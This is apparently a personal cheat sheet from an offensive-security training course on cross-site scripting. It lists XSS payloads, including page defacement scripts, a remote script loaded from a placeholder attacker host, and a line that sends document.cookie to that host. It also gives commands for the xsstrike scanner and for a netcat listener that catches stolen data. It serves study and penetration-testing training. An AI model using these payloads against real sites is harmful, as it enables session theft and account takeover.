---
title: Cross-Site Scripting (XSS)
description: Cross-Site Scripting (XSS) vulnerabilities are among the most common web application vulnerabilities. An XSS vulnerability may allow an attacker to execute arbitrary JavaScript code within the target's browser and result in complete web application compromise if chained together with other vulnerabilities. This module will teach you how to identify XSS vulnerabilities and exploit them.
author:
  - 21y4d
difficulty: Easy
tier: 2
type: Offensive
time: 6 hours
slug: cross-site-scripting
badge: /cheatsheets/badges/included-in-every-report.webp
module: /cheatsheets/cross-site-scripting.webp
badgeLink: https://academy.hackthebox.com/achievement/badge/8885dbd4-d588-11ee-891c-bea50ffe6cb4
moduleLink: https://academy.hackthebox.com/achievement/361848/103
completedAt: 2024-02-27
tags:
  - cheatsheet
  - CBBH
---
## Commands

|Code|Description|
|---|---|
|**XSS Payloads**||
|`<script>alert(window.origin)</script>`|Basic XSS Payload|
|`<plaintext>`|Basic XSS Payload|
|`<script>print()</script>`|Basic XSS Payload|
|`<img src="" onerror=alert(window.origin)>`|HTML-based XSS Payload|
|`<script>document.body.style.background = "#141d2b"</script>`|Change Background Color|
|`<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`|Change Background Image|
|`<script>document.title = 'HackTheBox Academy'</script>`|Change Website Title|
|`<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`|Overwrite website's main body|
|`<script>document.getElementById('urlform').remove();</script>`|Remove certain HTML element|
|`<script src="http://OUR_IP/script.js"></script>`|Load remote script|
|`<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`|Send Cookie details to us|
|**Commands**||
|`python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`|Run `xsstrike` on a url parameter|
|`sudo nc -lvnp 80`|Start `netcat` listener|
|`sudo php -S 0.0.0.0:80`|Start `PHP` server|